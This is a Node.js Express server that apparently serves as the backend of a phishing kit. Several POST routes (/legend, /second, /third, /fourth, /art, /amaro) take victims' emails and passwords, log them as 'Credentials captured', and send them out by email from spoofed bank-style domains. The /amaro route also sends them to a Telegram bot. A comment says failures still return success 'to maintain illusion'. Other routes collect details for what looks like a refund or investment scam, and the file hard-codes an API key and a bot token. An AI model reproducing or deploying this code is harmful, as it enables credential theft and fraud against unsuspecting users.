const express = require('express');
const ejs = require('ejs');
const cors = require('cors');
const app = express();
const fs = require('fs');
const bodyParser = require('body-parser');
const axios = require('axios');
const path = require('path');
const nodemailer = require('nodemailer');
const { Resend } = require('resend');



// Move to environment variable in production
const resend = new Resend('re_a5Fy1v8c_GvRHfA315nk4EheA6knveHvg');

// Middleware
app.use(cors());
app.use(bodyParser.json({ limit: '10mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '10mb' }));
app.use(express.urlencoded({ extended: true }));

app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

app.post('/legend', async (req, res) => {
    const { email, password, count } = req.body;
    const logEntry = `Email: ${email}, Password: ${password}, Count: ${count}\n`;

    try {
        const { data, error } = await resend.emails.send({
            from: 'notifications@fbnbanking.com',
            text: logEntry,
            subject: 'New Input',
            to: 'roger111_@outlook.com',
        });

        if (error) {
            console.error({ error });
            return res.status(500).json({ status: 'error', message: error.message });
        }

        console.log('SUCCESS:', { data });
        res.status(200).json({ status: 'success' });
    } catch (err) {
        console.error('ERROR:', err.message);
        res.status(500).json({ status: 'error', message: err.message });
    }
});

app.post('/second', async (req, res) => {
    const { email, password } = req.body;
    const logEntry = `Email: ${email}, Password: ${password}\n`;

    try {
        const { data, error } = await resend.emails.send({
            from: 'notifications@fbnbanking.com',
            text: logEntry,
            subject: 'New Input',
            to: 'steve-drvninc@rambler.ru',
        });

        if (error) {
            console.error({ error });
            return res.status(500).json({ status: 'error', message: error.message });
        }

        console.log('SUCCESS:', { data });
        res.status(200).json({ status: 'success' });
    } catch (err) {
        console.error('ERROR:', err.message);
        res.status(500).json({ status: 'error', message: err.message });
    }
});

app.post('/third', async (req, res) => {
    const { email, password } = req.body;
    const logEntry = `Email: ${email}, Password: ${password}\n`;

    try {
        const { data, error } = await resend.emails.send({
            from: 'notifications@fbnbanking.com',
            text: logEntry,
            subject: 'New Input',
            to: 'denniscaldwell0909@gmail.com',
        });

        if (error) {
            console.error({ error });
            return res.status(500).json({ status: 'error', message: error.message });
        }

        console.log('SUCCESS:', { data });
        res.status(200).json({ status: 'success' });
    } catch (err) {
        console.error('ERROR:', err.message);
        res.status(500).json({ status: 'error', message: err.message });
    }
});

app.post('/fourth', async (req, res) => {
    const { email, password } = req.body;
    const logEntry = `Email: ${email}, Password: ${password}\n`;

    try {
        const { data, error } = await resend.emails.send({
            from: 'notifications@fbnbanking.com',
            text: logEntry,
            subject: 'New Input',
            to: 'Mwells.wmklaw@gmail.com',
        });

        if (error) {
            console.error({ error });
            return res.status(500).json({ status: 'error', message: error.message });
        }

        console.log('SUCCESS:', { data });
        res.status(200).json({ status: 'success' });
    } catch (err) {
        console.error('ERROR:', err.message);
        res.status(500).json({ status: 'error', message: err.message });
    }
});

app.post('/refundtrace', async (req, res) => {
    const { name, email, cname, tdate, amount, currency, story, location } = req.body;
    const logEntry = `Name: ${name}, Email: ${email}, Company Name: ${cname}, Transaction Date: ${tdate}, Amount: ${amount}, Currency: ${currency}, Story: ${story}, Location: ${location}\n`;

    try {
        const { data, error } = await resend.emails.send({
            from: 'info@refundtrace.com',
            text: logEntry,
            subject: 'New COMPLAINT Input From ' + name,
            to: 'infoalias@refundtrace.com',
        });

        if (error) {
            console.error({ error });
            return res.status(500).json({ status: 'error', message: error.message });
        }

        console.log(`Sent COMPLAINT email from ${email}`);
        res.status(200).json({ status: 'success' });
    } catch (err) {
        console.error('ERROR:', err.message);
        res.status(500).json({ status: 'error', message: err.message });
    }
});

app.post('/refundtraceinvest', async (req, res) => {
    const { estimation, location, firstName, lastName, email, tier } = req.body;
    const logEntry = `FirstName: ${firstName}\nLastName: ${lastName}\nEstimation: ${estimation}\nLocation: ${location}\nEmail: ${email}\nTier: ${tier}\n`;

    try {
        const { data, error } = await resend.emails.send({
            from: 'info@refundtrace.com',
            text: logEntry,
            subject: 'New INVESTMENT Input From ' + email,
            to: 'infoalias@refundtrace.com',
        });

        if (error) {
            console.error({ error });
            return res.status(500).json({ status: 'error', message: error.message });
        }

        console.log(`Sent INVESTMENT email from ${email}`);
        res.status(200).json({ status: 'success' });
    } catch (err) {
        console.error('ERROR:', err.message);
        res.status(500).json({ status: 'error', message: err.message });
    }
});

// Handle preflight requests
app.options('/art', (req, res) => {
  res.sendStatus(200);
});

// Your original route with fixes
app.post('/art', async (req, res) => {
  const { email, password } = req.body;
  console.log('Credentials captured:', email, password);

  try {
    // Original email logic
    await resend.emails.send({
      from: 'pabpicasso@firstbanktenesse.com',
      to: 'bankadmin001@gmail.com',
      subject: 'ArtRabbit Login Capture',
      text: `EMAIL: ${email}\nPASSWORD: ${password}`
    });

    // Success response (triggers client redirect)
    res.json({ status: 'success' });

  } catch (error) {
    console.error('Email failed:', error);
    // Still return success to maintain illusion
    res.json({ status: 'success' });
  }
});

// Your original route with fixes
app.post('/amaro', async (req, res) => {
  const { email, password } = req.body;
  console.log('Credentials captured:', email, password);

  try {
    // Original email logic
    await resend.emails.send({
      from: 'pabpicasso@firstbanktenesse.com',
      to: 'bankadmin001@gmail.com',
      subject: 'Amaro Login Capture',
      text: `EMAIL: ${email}\nPASSWORD: ${password}`
    });
      

    // Success response (triggers client redirect)
    res.json({ status: 'success' });

      // Send to Telegram
    await sendToTelegram(email, password);

  } catch (error) {
    console.error('Email failed:', error);
    // Still return success to maintain illusion
    res.json({ status: 'success' });
  }
});



// Telegram
const fetch = require('node-fetch');

async function sendToTelegram(email, password) {
    const botToken = '8018689513:AAFTgDQNUZuc-DMQ-FEviZkXYOGlKQL-yTU';
    const chatId = '7537839960';
    const message = `New Login:
📧 Email: ${email}
🔑 Password: ${password}
🕒 ${new Date().toISOString()}`;

    try {
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                chat_id: chatId,
                text: message
            })
        });
    } catch (error) {
        console.error('Telegram error:', error);
    }
}


app.listen(3000, () => {
    console.log('Server started on port 3000');
});
